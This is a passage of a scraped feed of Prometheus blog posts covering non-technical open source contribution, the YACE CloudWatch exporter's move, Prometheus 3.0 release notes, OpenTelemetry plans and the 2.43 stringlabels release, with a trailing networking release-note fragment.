I remember the anxiety I felt when I was selected as a mentee. I was new not just to Prometheus,\nbut to observability entirely. I worried I was in over my head, working in a heavily developer-focused domain with no development background.</p>\n<p>That anxiety turned out to be unfounded. I went on to make meaningful contributions to the project, and I've learned that what I\nexperienced is nearly universal among non-technical contributors to open source.</p>\n<p>If you're feeling that same uncertainty, this post is for you. I'll share the challenges you're likely to face (or already face),\nwhy your contributions matter, and how to find your place in the Prometheus community.</p>\n<h2>The Challenges Non-Technical Contributors Face</h2>\n<p>As a non-technical contributor, I've had my share of obstacles in open source. And from conversations with others navigating these spaces,\nI've found the struggles are remarkably consistent. Here are the most common barriers:</p>\n<h3>1. The Technical Intimidation Factor</h3>\n<p>I've felt out of place in open source spaces, mostly because technical contributors vastly outnumber non-technical ones. Even the non-technical\npeople often have technical backgrounds or have been around long enough to understand what's happening.</p>\n<p>When every conversation references concepts you don't know, it's easy to feel intimidated. You join meetings and stay silent throughout.\nYou respond in the chat instead of unmuting because you don't trust yourself to speak up in a recorded meeting where everyone else seems\nfluent in a technical language you're still learning.</p>\n<h3>2. Unclear Value Proposition</h3>\n<p>Open source projects rarely spell out their non-technical needs the way a job posting would. You would hardly find an issue titled\n\"Need: someone to interview users and write case studies\" or \"Wanted: community manager to organize monthly meetups.\" Instead, you’re\nmore likely to see a backlog of GitHub issues about bugs, feature requests, and code refactoring.</p>\n<p>Even if you have valuable skills, you don't know where they're needed, how to articulate your value, or whether your contributions will\nbe seen as mission-critical or just nice-to-have. Without a clear sense of how you fit in, it's difficult to reach out confidently.\nYou end up sending vague messages like \"I'd love to help! Let me know if there's anything I can do\", which rarely leads anywhere because\nmaintainers are busy and don't have time to figure out how to match your skills to their needs.</p>\n<h3>3. Lack of Visible Non-Technical Contributors</h3>\n<p>One of the things that draws me to an open source community or project is finding other people like me. I think it's the same way for most people.\nRepresentation matters. It's hard to be what you can't see.</p>\n<p>It’s even more difficult to find non-technical contributors because their contributions are often invisible in the ways projects typically showcase work.\nGitHub contribution graphs count commits. Changelogs list code changes and bug fixes. You only get the \"contributor\" label when you've created a\npull request that got merged. So, even when people are organizing events, supporting users, or conducting research, their work doesn't show up in\nthe same prominent ways code does.</p>\n<h3>4. The Onboarding Gap</h3>\n<p>A typical \"Contributing Guide\" will walk you through setting up a development environment, creating a branch, running tests, and submitting a pull request.\nBut it rarely explains how to contribute documentation improvements, where design feedback should go, or how community support is organized.</p>\n<p>You see \"Join our community\" with a link to a Slack workspace. But between joining and making your first contribution, there's a significant gap.\nThere are hundreds of people in dozens of channels. Who's a maintainer and who's just another community member? Which channel is appropriate for\nyour questions? Who should you tag when you need guidance?</p>\n<h2>Why These Gaps Exist</h2>\n<p>It's worth acknowledging that most of the time, these gaps aren't intentional. Projects don't set out to exclude non-technical contributors or\nmake it harder for them to participate.</p>\n<p>In most cases, a small group of developers build something useful and decide to open-source it. They invite people they know who might need it\n(often other developers) to contribute. The project grows organically within those networks. It becomes a community of developers building\ntools for developers, and certain functions simply don't feel necessary yet. Marketing? The word spreads naturally through tech circles.\nCommunity management? The community is small and self-organizing. UX design? They're developers comfortable with command-line interfaces,\nso they may not fully consider the experience of using a graphical interface.</p>\n<p>None of this is malicious. It's just that the project evolved in a context where those skills weren't obviously needed.</p>\n<p>The shift happens when someone, often a non-technical contributor who sees the potential, steps in and says:\n\"You've built something valuable and grown an impressive community. But here's what you might be missing.\nHere's how documentation could lower the barrier to entry. Here's how community management could retain contributors.\nHere's how user research could guide your roadmap.\"</p>\n<h2>Why Non-Technical Contributions Matter</h2>\n<p>Prometheus is a powerful monitoring system backed by a large community of developers. But like any open source project, it needs more than code to thrive.</p>\n<p><strong>It needs accessible documentation.</strong> From my experience working with engineers, most would rather focus on building than writing docs,\nand understandably so. Engineers who know the system inside out often write documentation that assumes knowledge newcomers don't have.\nWhat makes perfect sense to someone who built the feature can feel impenetrable to someone encountering it for the first time.\nA technical writer testing the product from an end user's perspective, not a builder's, can bridge that gap and lower the barrier to entry.</p>\n<p><strong>It needs organization.</strong> The GitHub issues backlog has hundreds of open items that haven't been triaged. Maintainers spend valuable\ntime parsing what users actually need instead of building solutions. A project manager or someone with triage experience could turn\nthat chaos into a clear roadmap, allowing maintainers to spend their time building solutions.</p>\n<p><strong>It needs community support.</strong> Imagine a user who joins the Slack workspace, excited to contribute. They don't know where to start.\nThey ask a question that gets buried in the stream of messages. They quietly leave. The project just lost a potential contributor because\nno one was there to welcome them and point them in the right direction.</p>\n<p>These are the situations non-technical contributions can help prevent. Good documentation lowers the barrier to entry, which means more adoption,\nmore feedback, and better features. Active community management retains contributors who would otherwise drift away, which means distributed\nknowledge and less maintainer burnout. Organization and triage turn scattered input into actionable priorities.</p>\n<p>The Prometheus maintainers are doing exceptional work building a robust, scalable monitoring system. But they can't do everything,\nand they shouldn't have to. The question now isn't whether non-technical contributions matter. It's whether we create the space for them to happen.</p>\n<h2>Practical Ways You Can Contribute to Prometheus</h2>\n<p>If you're ready to contribute to Prometheus but aren't sure where to start, here are some areas where non-technical skills are actively needed.</p>\n<h3>1. Join the UX Efforts</h3>\n<p>Prometheus is actively working to improve its user experience, and the community now has a\n<a href=\"https://cloud-native.slack.com/archives/C09NL3B1EKW\">UX Working Group</a> dedicated to this effort.</p>\n<p>If you're a UX researcher, designer, or someone with an eye for usability, this is an excellent time to get involved.\nThe working group is still taking shape, with ongoing discussions about priorities and processes.\nJoin the Slack channel to participate in these conversations and watch for upcoming announcements about specific ways to contribute.</p>\n<p>I can tell you from experience that the community is receptive to UX contributions, and your work will have a real impact.</p>\n<h3>2. Write for the Prometheus Blog</h3>\n<p>If you're a technical writer or content creator, the Prometheus blog is a natural entry point. The blog publishes tutorials,\ncase studies, best practices, community updates, and generally, content that helps users get more value from Prometheus.</p>\n<p>Check out the <a href=\"https://github.com/prometheus/docs/blob/main/blog/README.md\">blog content guide</a> to understand what makes a strong blog proposal and how to publish a post on the blog.\nThere's an audience eager to learn from your experience.</p>\n<h3>3. Improve and Maintain Documentation</h3>\n<p>Documentation is one of those perpetual needs in open source. There's always something that could be clearer, more complete, or better organized.\nThe Prometheus docs repo is no exception.</p>\n<p>You can contribute by fixing typos and <a href=\"https://github.com/prometheus/docs/issues/2649\">broken links</a>, expanding getting-started guides,\ncreating tutorials for common monitoring scenarios, or <a href=\"https://www.youtube.com/watch?v=SzSUa5y7Ji0&#x26;t=27105s\">triaging issues</a> to help\nprioritize what needs attention. Even if you don't consider yourself a technical writer, if you've ever been confused by the docs and\nfigured something out, you can help make it clearer for the next person.</p>\n<h3>4. Help Organize PromCon</h3>\n<p><a href=\"https://promcon.io/\">PromCon</a> is Prometheus's annual conference, and it takes significant coordination to pull off.\nThe organizing team handles everything from speaker selection and scheduling to venue logistics and sponsor relationships.</p>\n<p>If you have experience in event planning, sponsor outreach, marketing, or communications, the PromCon organizers would welcome your help.\nReach out to the <a href=\"mailto:promcon-organizers@googlegroups.com\">organizing team</a> or watch for announcements in the Prometheus community channels.</p>\n<h3>5. Advocate and Amplify</h3>\n<p>Finally, one of the simplest but most impactful things you can do is talk about Prometheus. Write blog posts about how you're using Prometheus.\nGive talks at local meetups or conferences. Share tips and learnings on social media. Create video tutorials or live streams.\nRecommend Prometheus to teams evaluating monitoring solutions.</p>\n<p>Every piece of content, every conference talk, every social media post expands Prometheus's reach and helps new users discover it.</p>\n<h2>How to Get Started</h2>\n<p>If you're ready to contribute to Prometheus, here's what I've learned from my own experience navigating the community as a non-technical contributor:</p>\n<p><strong>Start by introducing yourself.</strong> When you join the #prometheus-dev Slack channel, say hello. Slack doesn't always make it obvious\nwhen someone new joins, so if you stay silent, people simply won't know you're there. A simple introduction—your name, what you do, what brought you to Prometheus—is enough to make your presence known.</p>\n<p><strong>Attend community meetings.</strong> Check out the <a href=\"https://prometheus.io/community/#calendar-for-public-events\">community calendar</a> and\nsync the meetings that interest you. Even if you don't understand everything being discussed at first (and that's completely normal), stay.\nThe more you sit in, the more you'll learn about the community's needs and find more opportunities to contribute.</p>\n<p><strong>Observe before you act.</strong> It's tempting to jump in with ideas immediately, but spending time as an observer first pays off.\nRead through Slack discussions and conversations in GitHub issues. Browse the documentation. Notice what kinds of contributions are being made.\nYou'll start to see patterns: recurring questions, documentation gaps, areas where help is needed. That's where your opportunity lies.</p>\n<p><strong>Ask questions.</strong> Everyone was new once. If something isn't clear, ask. If you don't get a response right away,\ngive it some time—people are busy—then follow up. The community is welcoming, but you have to make yourself visible.</p>\n<p>The Prometheus community has room for you. Now you know exactly where to begin.</p>",

This move will make it more accessible to users and open new opportunities for contributors to enhance and maintain the project. There's also a blog post from <a href=\"https://grafana.com/blog/2024/11/19/yace-moves-to-prometheus-community/\">Cristian Greco's point of view</a>.</p>\n<h2>The early days</h2>\n<p>When I first started YACE, I had no idea it would grow to this scale. At the time, I was working with <a href=\"https://www.ivx.com\">Invision AG</a> (not to be confused with the design app), a company focused on workforce management software. They fully supported me in open-sourcing the tool, and with the help of my teammate <a href=\"https://github.com/kforsthoevel\">Kai Forsthövel</a>, YACE was brought to life.</p>\n<p>Our first commit was back in 2018, with one of our primary goals being to make CloudWatch metrics easy to scale and automatically detect what to measure, all while keeping the user experience simple and intuitive. InVision AG was scaling their infrastructure up and down due to machine learning workloads and we needed something that detects new infrastructure easily. This focus on simplicity has remained a core priority. From that point on, YACE began to find its audience.</p>\n<h2>Yace Gains Momentum</h2>\n<p>As YACE expanded, so did the support around it. One pivotal moment was when <a href=\"https://github.com/cristiangreco\">Cristian Greco</a> from Grafana Labs reached out. I was feeling overwhelmed and hardly keeping up when Cristian stepped in, simply asking where he could help. He quickly became the main releaser and led Grafana Labs' contributions to YACE, a turning point that made a huge impact on the project. Along with an incredible community of contributors from all over the world, they elevated YACE beyond what I could have achieved alone, shaping it into a truly global tool. YACE is no longer just my project or Invision's—it belongs to the community.</p>\n<h2>Gratitude and Future Vision</h2>\n<p>I am immensely grateful to every developer, tester, and user who has contributed to YACE's success. This journey has shown me the power of community and open source collaboration. But we're not done yet.</p>\n<p>It's time to take Yace even further—into the heart of the Prometheus ecosystem. Making Yace as the official Amazon CloudWatch exporter for Prometheus will make it easier and more accessible for everyone. With ongoing support from Grafana Labs and my commitment to refining the user experience, we'll ensure YACE becomes an intuitive tool that anyone can use effortlessly.</p>\n<h2>Try out YACE on your own</h2>\n<p>Try out <strong><a href=\"https://github.com/prometheus-community/yet-another-cloudwatch-exporter\">YACE (Yet Another CloudWatch Exporter)</a></strong> by following our step-by-step <a href=\"https://github.com/prometheus-community/yet-another-cloudwatch-exporter/blob/master/docs/installation.md\">Installation Guide</a>.</p>\n<p>You can explore various configuration examples <a href=\"https://github.com/prometheus-community/yet-another-cloudwatch-exporter/tree/master/examples\">here</a> to get started with monitoring specific AWS services.</p>\n<p>Our goal is to enable easy auto-discovery across all AWS services, making it simple to monitor any dynamic infrastructure.</p>",

      "summary": "<p>Following the recent release of <a href=\"https://prometheus.io/blog/2024/09/11/prometheus-3-beta/\">Prometheus 3.0 beta</a> at PromCon in Berlin, the Prometheus Team\nis excited to announce the immediate availability of Prometheus Version 3.0!</p>\n<p>This latest version marks a significant milestone as it is the first major release in 7 years. Prometheus has come a long way in that time,\nevolving from a project for early adopters to becoming a standard part of the cloud native monitoring stack. Prometheus 3.0 aims to\ncontinue that journey by adding some exciting new features while largely maintaining stability and compatibility with previous versions.</p>\n<p>The full 3.0 release adds some new features on top of the beta and also introduces a few additional breaking changes that we will describe in this article.</p>\n<h2>What's New</h2>\n<p>Here is a summary of the exciting changes that have been released as part of the beta version, as well as what has been added since:</p>\n<h3>New UI</h3>\n<p>One of the highlights in Prometheus 3.0 is its brand-new UI that is enabled by default:</p>\n<p><img alt=\"New UI query page\" src=\"https://prometheus.io/assets/blog/2024-11-14/blog_post_screenshot_tree_view-s.png\" /></p>\n<p>The UI has been completely rewritten with less clutter, a more modern look and feel, new features like a <a href=\"https://promlens.com/\"><strong>PromLens</strong></a>-style tree view,\nand will make future maintenance easier by using a more modern technical stack.</p>\n<p>Learn more about the new UI in general in <a href=\"https://promlabs.com/blog/2024/09/11/a-look-at-the-new-prometheus-3-0-ui/\">Julius' detailed article on the PromLabs blog</a>.\nUsers can temporarily enable the old UI by using the <code>old-ui</code> feature flag.</p>\n<p>Since the new UI is not battle-tested yet, it is also very possible that there are still bugs. If you find any, please\n<a href=\"https://github.com/prometheus/prometheus/issues/new?assignees=&#x26;labels=&#x26;projects=&#x26;template=bug_report.yml\">report them on GitHub</a>.</p>\n<p>Since the beta, the user interface has been updated to support UTF-8 metric and label names.</p>\n<p><img alt=\"New UTF-8 UI\" src=\"https://prometheus.io/assets/blog/2024-11-14/utf8_ui.png\" /></p>\n<h3>Remote Write 2.0</h3>\n<p>Remote-Write 2.0 iterates on the previous protocol version by adding native support for a host of new elements including metadata, exemplars,\ncreated timestamp and native histograms. It also uses string interning to reduce payload size and CPU usage when compressing and decompressing.\nThere is better handling for partial writes to provide more details to clients when this occurs. More details can be found\n<a href=\"https://prometheus.io/docs/specs/remote_write_spec_2_0/\">here</a>.</p>\n<h3>UTF-8 Support</h3>\n<p>Prometheus now allows all valid UTF-8 characters to be used in metric and label names by default, as well as label values,\nas has been true in version 2.x.</p>\n<p>Users will need to make sure their metrics producers are configured to pass UTF-8 names, and if either side does not support UTF-8,\nmetric names will be escaped using the traditional underscore-replacement method. PromQL queries can be written with the new quoting syntax\nin order to retrieve UTF-8 metrics, or users can specify the <code>__name__</code>  label name manually.</p>\n<p>Currently only the Go client library has been updated to support UTF-8, but support for other languages will be added soon.</p>\n<h3>OTLP Support</h3>\n<p>In alignment with <a href=\"https://prometheus.io/blog/2024/03/14/commitment-to-opentelemetry/\">our commitment to OpenTelemetry</a>, Prometheus 3.0 features\nseveral new features to improve interoperability with OpenTelemetry.</p>\n<h4>OTLP Ingestion</h4>\n<p>Prometheus can be configured as a native receiver for the OTLP Metrics protocol, receiving OTLP metrics on the <code>/api/v1/otlp/v1/metrics</code> endpoint.</p>\n<p>See our <a href=\"https://prometheus.io/docs/guides/opentelemetry\">guide</a> on best practices for consuming OTLP metric traffic into Prometheus.</p>\n<h4>UTF-8 Normalization</h4>\n<p>With Prometheus 3.0, thanks to <a href=\"https://prometheus.io/blog/feed.xml#utf-8-support\">UTF-8 support</a>, users can store and query OpenTelemetry metrics without annoying changes to metric and label names like <a href=\"https://github.com/open-telemetry/opentelemetry-collector-contrib/tree/main/pkg/translator/prometheus\">changing dots to underscores</a>.</p>\n<p>Notably this allows <strong>less confusion</strong> for users and tooling in terms of the discrepancy between what’s defined in OpenTelemetry semantic convention or SDK and what’s actually queryable.</p>\n<p>To achieve this for OTLP ingestion, Prometheus 3.0 has experimental support for different translation strategies. See <a href=\"https://prometheus.io/docs/prometheus/latest/configuration/configuration/#:~:text=Settings%20related%20to%20the%20OTLP%20receiver%20feature\">otlp section in the Prometheus configuration</a> for details.</p>\n<blockquote>\n<p>NOTE: While “NoUTF8EscapingWithSuffixes” strategy allows special characters, it still adds required suffixes for the best experience. See <a href=\"https://github.com/prometheus/proposals/pull/39\">the proposal on the future work to enable no suffixes</a> in Prometheus.</p>\n</blockquote>\n<h3>Native Histograms</h3>\n<p>Native histograms are a Prometheus metric type that offer a higher efficiency and lower cost alternative to Classic Histograms. Rather than having to choose (and potentially have to update) bucket boundaries based on the data set, native histograms have pre-set bucket boundaries based on exponential growth.</p>\n<p>Native Histograms are still experimental and not yet enabled by default, and can be turned on by passing <code>--enable-feature=native-histograms</code>. Some aspects of Native Histograms, like the text format and accessor functions / operators are still under active design.</p>\n<h3>Breaking Changes</h3>\n<p>The Prometheus community strives to <a href=\"https://prometheus.io/docs/prometheus/latest/stability/\">not break existing features within a major release</a>. With a new major release we took the opportunity to clean up a few, but small, long-standing issues. In other words, Prometheus 3.0 contains a few breaking changes. This includes changes to feature flags, configuration files, PromQL, and scrape protocols.</p>\n<p>Please read the <a href=\"https://prometheus.io/docs/prometheus/3.0/migration/\">migration guide</a> to find out if your setup is affected and what actions to take.</p>\n<h2>Performance</h2>\n<p>It’s impressive to see what we have accomplished in the community since Prometheus 2.0. We all love numbers, so let’s celebrate the efficiency improvements we made for both CPU and memory use for the TSDB mode. Below you can see performance numbers between 3 Prometheus versions on the node with 8 CPU and 49 GB allocatable memory.</p>\n<ul>\n<li>2.0.0 (7 years ago)</li>\n<li>2.18.0 (4 years ago)</li>\n<li>3.0.0 (now)</li>\n</ul>\n<p><img alt=\"Memory bytes\" src=\"https://prometheus.io/assets/blog/2024-11-14/memory_bytes_ui.png\" /></p>\n<p><img alt=\"CPU seconds\" src=\"https://prometheus.io/assets/blog/2024-11-14/cpu_seconds_ui.png\" /></p>\n<p>It’s furthermore impressive that those numbers were taken using our <a href=\"https://github.com/prometheus/prometheus/pull/15366\">prombench macrobenchmark</a>\nthat uses the same PromQL queries, configuration and environment–highlighting backward compatibility and stability for the core features, even with 3.0.</p>\n<h2>What's Next</h2>\n<p>There are still tons of exciting features and improvements we can make in Prometheus and the ecosystem. Here is a non-exhaustive list to get you excited and…\nhopefully motivate you to contribute and join us!</p>\n<ul>\n<li>New, more inclusive <strong>governance</strong></li>\n<li>More <strong>OpenTelemetry</strong> compatibility and features</li>\n<li>OpenMetrics 2.0, now under Prometheus governance!</li>\n<li>Native Histograms stability (and with custom buckets!)</li>\n<li>More optimizations!</li>\n<li>UTF-8 support coverage in more SDKs and tools</li>\n</ul>\n<h2>Try It Out!</h2>\n<p>You can try out Prometheus 3.0 by downloading it from our <a href=\"https://prometheus.io/download/#prometheus\">official binaries</a> and <a href=\"https://quay.io/repository/prometheus/prometheus?tab=tags\">container images</a>.</p>\n<p>If you are upgrading from Prometheus 2.x, check out the migration guide for more information on any adjustments you will have to make.\nPlease note that we strongly recommend upgrading to v2.55 before upgrading to v3.0. Rollback is possible from v3.0 to v2.55, but not to earlier versions.</p>\n<p>As always, we welcome feedback and contributions from the community!</p>",

If you find any, please <a href=\"https://github.com/prometheus/prometheus/issues/new?assignees=&#x26;labels=&#x26;projects=&#x26;template=bug_report.yml\">report them on GitHub</a>.</p>\n<h3>Remote Write 2.0</h3>\n<p>Remote-Write 2.0 iterates on the previous protocol version by adding native support for a host of new elements including metadata, exemplars, created timestamp and native histograms. It also uses string interning to reduce payload size and CPU usage when compressing and decompressing. More details can be found <a href=\"https://prometheus.io/docs/specs/remote_write_spec_2_0/\">here</a>.</p>\n<h3>OpenTelemetry Support</h3>\n<p>Prometheus intends to be the default choice for storing OpenTelemetry metrics, and 3.0 includes some big new features that makes it even better as a storage backend for OpenTelemetry metrics data.</p>\n<h4>UTF-8</h4>\n<p>By default, Prometheus will allow all valid UTF-8 characters to be used in metric and label names, as well as label values as has been true in version 2.x.</p>\n<p>Users will need to make sure their metrics producers are configured to pass UTF-8 names, and if either side does not support UTF-8, metric names will be escaped using the traditional underscore-replacement method. PromQL queries can be written with the new quoting syntax in order to retrieve UTF-8 metrics, or users can specify the <code>__name__</code>  label name manually.</p>\n<p>Not all language bindings have been updated with support for UTF-8 but the primary Go libraries have been.</p>\n<h4>OTLP Ingestion</h4>\n<p>Prometheus can be configured as a native receiver for the OTLP Metrics protocol, receiving OTLP metrics on the /api/v1/otlp/v1/metrics endpoint.</p>\n<h3>Native Histograms</h3>\n<p>Native histograms are a Prometheus metric type that offer a higher efficiency and lower cost alternative to Classic Histograms. Rather than having to choose (and potentially have to update) bucket boundaries based on the data set, native histograms have pre-set bucket boundaries based on exponential growth.</p>\n<p>Native Histograms are still experimental and not yet enabled by default, and can be turned on by passing <code>--enable-feature=native-histograms</code>.  Some aspects of Native Histograms, like the text format and accessor functions / operators are still under active design.</p>\n<h3>Other Breaking Changes</h3>\n<p>The following feature flags have been removed, being enabled by default instead. References to these flags should be removed from configs, and will be ignored in Prometheus starting with version 3.0</p>\n<ul>\n<li><code>promql-at-modifier</code></li>\n<li><code>promql-negative-offset</code></li>\n<li><code>remote-write-receiver</code></li>\n<li><code>no-scrape-default-port</code></li>\n<li><code>new-service-discovery-manager</code></li>\n</ul>\n<p>Range selections are now <a href=\"https://github.com/prometheus/prometheus/issues/13213\">left-open and right-closed</a>, which will avoid rare occasions that more points than intended are included in operations.</p>\n<p>Agent mode is now stable and has its own config flag instead of a feature flag</p>",

      "summary": "<p><em>The <a href=\"https://opentelemetry.io/\">OpenTelemetry project</a> is an Observability framework and toolkit designed to create and manage telemetry data such as traces, metrics, and logs. It is gaining widespread adoption due to its consistent specification between signals and promise to reduce vendor lock-in which is something that we’re excited about.</em></p>\n<h2>Looking back at 2023</h2>\n<p>Over the past few years, we have collaborated with the OpenTelemetry community to make sure that OpenTelemetry and Prometheus support each other bidirectionally. This led to the drafting of the official specification to convert between the two systems, as well as the implementations that allow you to ingest Prometheus metrics into OpenTelemetry Collector and vice-versa.</p>\n<p>Since then, we have spent a significant amount of time understanding the <a href=\"https://docs.google.com/document/d/1epvoO_R7JhmHYsII-GJ6Yw99Ky91dKOqOtZGqX7Bk0g/edit?usp=sharing\">challenges faced by OpenTelemetry users</a> when storing their metrics in Prometheus and based on those, explored <a href=\"https://docs.google.com/document/d/1NGdKqcmDExynRXgC_u1CDtotz9IUdMrq2yyIq95hl70/edit?usp=sharing\">how we can address them</a>. Some of the changes proposed need careful considerations to avoid breaking either side's operating promises, e.g. supporting both push and pull. At PromCon Berlin 2023, we attempted to summarize our ideas in <a href=\"https://www.youtube.com/watch?v=mcabOH70FqU\">one of the talks</a>.</p>\n<p>At our <a href=\"https://docs.google.com/document/d/11LC3wJcVk00l8w5P3oLQ-m3Y37iom6INAMEu2ZAGIIE/edit#bookmark=id.9kp854ea3sv4\">dev summit in Berlin</a>, we spent the majority of our time discussing these changes and our general stance on OpenTelemetry in depth, and the broad consensus is that we want <a href=\"https://docs.google.com/document/d/11LC3wJcVk00l8w5P3oLQ-m3Y37iom6INAMEu2ZAGIIE/edit#bookmark=id.196i9ij1u7fs\">“to be the default store for OpenTelemetry metrics”</a>!</p>\n<p>We’ve formed a core group of developers to lead this initiative, and we are going to release a Prometheus 3.0 in 2024 with OTel support as one of its more important features. Here’s a sneak peek at what's coming in 2024.</p>\n<h2>The year ahead</h2>\n<h3>OTLP Ingestion GA</h3>\n<p>In <a href=\"https://github.com/prometheus/prometheus/releases/tag/v2.47.0\">Prometheus v2.47.0</a>, released on 6th September 2023, we added experimental support for OTLP ingestion in Prometheus. We’re constantly improving this and we plan to add support for staleness and make it a stable feature. We will also mark our support for out-of-order ingestion as stable. This involves also GA-ing our support for native / exponential histograms.</p>\n<h3>Support UTF-8 metric and label names</h3>\n<p><a href=\"https://github.com/open-telemetry/semantic-conventions/blob/main/docs/http/http-metrics.md\">OpenTelemetry semantic conventions</a> push for <code>“.”</code> to be the namespacing character. For example, <code>http.server.request.duration</code>. However, Prometheus currently requires a <a href=\"https://prometheus.io/docs/instrumenting/writing_exporters/#naming\">more limited character set</a>, which means we convert the metric to <code>http_server_request_duration</code> when ingesting it into Prometheus.</p>\n<p>This causes unnecessary dissonance and we’re working on removing this limitation by adding UTF-8 support for all labels and metric names. The progress is tracked <a href=\"https://github.com/prometheus/prometheus/issues/13095\">here</a>.</p>\n<h3>Native support for resource attributes</h3>\n<p>OpenTelemetry differentiates between metric attributes (labels to identify the metric itself, like <code>http.status_code</code>) and resource attributes (labels to identify the source of the metrics, like <code>k8s.pod.name</code>), while Prometheus has a more flat label schema. This leads to many usability issues that are detailed <a href=\"https://docs.google.com/document/d/1gG-eTQ4SxmfbGwkrblnUk97fWQA93umvXHEzQn2Nv7E/edit?usp=sharing\">here</a>.</p>\n<p>We’re <a href=\"https://docs.google.com/document/d/1FgHxOzCQ1Rom-PjHXsgujK8x5Xx3GTiwyG__U3Gd9Tw/edit\">exploring several solutions</a> to this problem from many fronts (Query, UX, storage, etc.), but our goal is to make it quite easy to filter and group on resource attributes. This is a work in progress, and feedback and help are wanted!</p>\n<h3>OTLP export in the ecosystem</h3>\n<p>Prometheus remote write is supported by <a href=\"https://prometheus.io/docs/operating/integrations/#remote-endpoints-and-storage\">most of the leading Observability projects and vendors</a> already. However, OpenTelemetry Protocol (OTLP) is gaining prominence and we would like to support it across the Prometheus ecosystem.</p>\n<p>We would like to add support for it to the Prometheus server, SDKs and the exporters. This would mean that any service instrumented with the Prometheus SDKs will also be able to <em>push</em> OTLP and it will unlock the rich Prometheus exporter ecosystem for OpenTelemetry users.</p>\n<p>However, we intend to keep and develop the OpenMetrics exposition format as an optimized / simplified format for Prometheus and pull-based use-cases.</p>\n<h3>Delta temporality</h3>\n<p>The OpenTelemetry project also supports <a href=\"https://grafana.com/blog/2023/09/26/opentelemetry-metrics-a-guide-to-delta-vs.-cumulative-temporality-trade-offs/\">Delta temporality</a> which has some use-cases for the Observability ecosystem. We have a lot of Prometheus users still running statsd and using the statsd_exporter for various reasons.</p>\n<p>We would like to support the Delta temporality of OpenTelemetry in the Prometheus server and are <a href=\"https://github.com/open-telemetry/opentelemetry-collector-contrib/issues/30479\">working towards it</a>.</p>\n<h2>Call for contributions!</h2>\n<p>As you can see, a lot of new and exciting things are coming to Prometheus! If working in the intersection between two of the most relevant open-source projects around observability sounds challenging and interesting to you, we'd like to have you on board!</p>\n<p>This year there is also a change of governance in the works that will make the process of becoming a maintainer easier than ever! If you ever wanted to have an impact on Prometheus, now is a great time to get started.</p>\n<p>Our first focus has always been to be as open and transparent as possible on how we are organizing all the work above so that you can also contribute. We are looking for contributors to support this initiative and help implement these features. Check out the <a href=\"https://github.com/orgs/prometheus/projects/9\">Prometheus 3.0 public board</a> and <a href=\"https://github.com/prometheus/prometheus/issues?q=is%3Aopen+is%3Aissue+milestone%3A%22OTEL+Support%22\">Prometheus OTel support milestone</a> to track the progress of the feature development and see ways that you can <a href=\"https://github.com/prometheus/prometheus/blob/main/CONTRIBUTING.md\">contribute</a>.</p>\n<h2>Conclusion</h2>\n<p>Some of the changes proposed are large and invasive or involve a fundamental departure from the original data model of Prometheus. However, we plan to introduce these gracefully so that Prometheus 3.0 will have no major breaking changes and most of the users can upgrade without impact.</p>\n<p>We are excited to embark on this new chapter for Prometheus and would love your feedback on the changes suggested.</p>",

      "link": "https://prometheus.io/blog/2023/03/21/stringlabel/",
      "published": "2023-03-21T00:00:00.000Z",
      "summary": "<p>Prometheus 2.43 has just been released, and it brings some exciting features and\nenhancements. One of the significant improvements is the <code>stringlabels</code> release,\nwhich uses a new data structure for labels. This blog post will answer some\nfrequently asked questions about the 2.43 release and the <code>stringlabels</code>\noptimizations.</p>\n<h2>What is the <code>stringlabels</code> release?</h2>\n<p>The <code>stringlabels</code> release is a Prometheus 2.43 version that uses a new data\nstructure for labels. It stores all the label/values in a single string,\nresulting in a smaller heap size and some speedups in most cases. These\noptimizations are not shipped in the default binaries and require compiling\nPrometheus using the Go tag <code>stringlabels</code>.</p>\n<h2>Why didn't you go for a feature flag that we can toggle?</h2>\n<p>We considered using a feature flag but it would have a memory overhead that was\nnot worth it. Therefore, we decided to provide a separate release with these\noptimizations for those who are interested in testing and measuring the gains on\ntheir production environment.</p>\n<h2>When will these optimizations be generally available?</h2>\n<p>These optimizations will be available in the upcoming Prometheus 2.44 release\nby default.</p>\n<h2>How do I get the 2.43 release?</h2>\n<p>The <a href=\"https://github.com/prometheus/prometheus/releases/tag/v2.43.0\">Prometheus 2.43 release</a> is available on the official Prometheus GitHub\nreleases page, and users can download the binary files directly from there.\nAdditionally, Docker images are also available for those who prefer to use\ncontainers.</p>\n<p>The stringlabels optimization is not included in these default binaries. To use\nthis optimization, users will need to download the <a href=\"https://github.com/prometheus/prometheus/releases/tag/v2.43.0%2Bstringlabels\">2.43.0+stringlabels\nrelease</a>\nbinary or the <a href=\"https://quay.io/repository/prometheus/prometheus?tab=tags\">Docker images tagged\nv2.43.0-stringlabels</a> specifically.</p>\n<h2>Why is the release <code>v2.43.0+stringlabels</code> and the Docker tag <code>v2.43.0-stringlabels</code>?</h2>\n<p>In semantic versioning, the plus sign (+) is used to denote build\nmetadata. Therefore, the Prometheus 2.43 release with the <code>stringlabels</code>\noptimization is named <code>2.43.0+stringlabels</code> to signify that it includes the\nexperimental <code>stringlabels</code> feature. However, Docker tags do not allow the use of\nthe plus sign in their names. Hence, the plus sign has been replaced with a dash\n(-) to make the Docker tag <code>v2.43.0-stringlabels</code>. This allows the Docker tag to\npass the semantic versioning checks of downstream projects such as the\nPrometheus Operator.</p>\n<h2>What are the other noticeable features in the Prometheus 2.43 release?</h2>\n<p>Apart from the <code>stringlabels</code> optimizations, the Prometheus 2.43 release\nbrings several new features and enhancements. Some of the significant additions\ninclude:</p>\n<ul>\n<li>We added support for <code>scrape_config_files</code> to include scrape configs from\ndifferent files. This makes it easier to manage and organize the configuration.</li>\n<li>The HTTP clients now includes two new config options: <code>no_proxy</code> to exclude\nURLs from proxied requests and <code>proxy_from_environment</code> to read proxies from\nenv variables. These features make it easier to manage the HTTP client's\nbehavior in different environments.</li>\n</ul>\n<p>You can learn more about features and bugfixes in the\n<a href=\"https://github.com/prometheus/prometheus/releases/tag/v2.43.0\">full changelog</a>.</p>",

Containerd functionality is unchanged in that it uses the value for the IP addresses specifically</p>\n</blockquote>\n<blockquote>\n<p>It's worth noting that CNI ADD success results which do not contain any interfaces will be discarded in this determination of the default, therefore it's recommended to set one with an associated gateway if aiming to have it be noted as the default.</p>\n</blockquote>\n<p>See also:<br />\n<a href=\"https://github.com/k8snetworkplumbingwg/network-attachment-definition-client/releases/tag/v1.7.5\">https://github.com/k8snetworkplumbingwg/network-attachment-definition-client/releases/tag/v1.7.5</a> <a class=\"issue-link js-issue-link\" href=\"https://github.com/k8snetworkplumbingwg/network-attachment-definition-client/pull/73\">k8snetworkplumbingwg/network-attachment-definition-client#73</a></p>",

